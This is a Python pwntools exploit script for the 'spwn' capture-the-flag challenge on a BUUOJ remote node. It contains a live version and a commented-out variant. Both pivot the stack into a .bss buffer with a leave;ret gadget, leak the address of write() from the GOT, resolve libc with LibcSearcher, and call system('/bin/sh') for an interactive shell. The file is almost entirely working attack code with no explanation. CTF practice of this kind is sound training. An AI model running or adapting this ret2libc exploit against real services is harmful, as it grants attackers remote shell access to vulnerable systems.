from pwn import *
from LibcSearcher import *

context(arch='x86', os='linux', log_level='debug')

p=process(['/mnt/hgfs/CyberSecurity/PWN/buuoj/spwn'])
p=remote('node4.buuoj.cn',28537)
elf=ELF('/mnt/hgfs/CyberSecurity/PWN/buuoj/spwn')

write_plt=elf.plt['write']
write_got=elf.got['write']
main=0x8048513
s=0x0804A300
leave_ret=0x08048408

payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
p.recvuntil("What is your name?")
p.send(payload)

payload1=b'a'*0x18+p32(s-4)+p32(leave_ret)
p.recvuntil("What do you want to say?")
p.send(payload1)

write_addr=u32(p.recv(4))

libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
system=libc_base+libc.dump('system')
sh=libc_base+libc.dump('str_bin_sh')

p.recvuntil("name?")
payload=p32(system)+p32(0)+p32(sh)
p.sendline(payload)

p.recvuntil("say?")
p.sendline(payload1)

p.interactive()

# from LibcSearcher import LibcSearcher
# from pwn import *
#
#
# # puts("GoodBye!");
#
# def spwn(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/spwn'):
#     print('spwn start')
#     context(log_level='debug', arch='i386', os='linux')
#     target = process([file_name])
#     target = remote('node4.buuoj.cn', 28537)
#     target_elf = ELF(file_name)
#
#     s_bss = p32(0x0804A300)
#     leave_ret = p32(0x08048511)
#     vul_func_addr = p32(target_elf.symbols['vul_function'])
#     pop_ret_gadget = p32(0x08048329)  # pop ebx ; ret
#     pop3_ret_gadget = p32(0x080485a9)  # pop esi ; pop edi ; pop ebp ; ret
#     write_plt = p32(target_elf.plt['write'])
#     write_got = p32(target_elf.got['write'])
#
#     # write(0x1, write_got, 0x4)
#     payload_1 = b'a' * 4
#     payload_1 += write_plt + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)
#     # vul_function()
#     payload_1 += vul_func_addr
#
#     payload_2 = b'a' * 24
#     payload_2 += s_bss
#     payload_2 += leave_ret
#
#     target.sendlineafter('What is your name?', payload_1)
#     target.sendlineafter('What do you want to say?', payload_2)
#
#     write_addr = u32(target.recv(4))
#
#     searcher = LibcSearcher('write', write_addr)
#     libc_base = write_addr - searcher.dump('write')
#     system_addr = p32(libc_base + searcher.dump('system'))
#     bin_sh_addr = p32(libc_base + searcher.dump('str_bin_sh'))
#
#     # system('/bin/sh')
#     payload_1 = s_bss + system_addr + pop_ret_gadget + bin_sh_addr
#
#
#     payload_2 = b'abcdefg'
#     payload_2 += s_bss
#     payload_2 += leave_ret
#
#     # gdb.attach(target)
#     target.sendlineafter('What is your name?', payload_1)
#     target.sendlineafter('What do you want to say?', payload_2)
#     target.interactive()
#     print('spwn end')
#
#
# if __name__ == '__main__':
#     spwn()
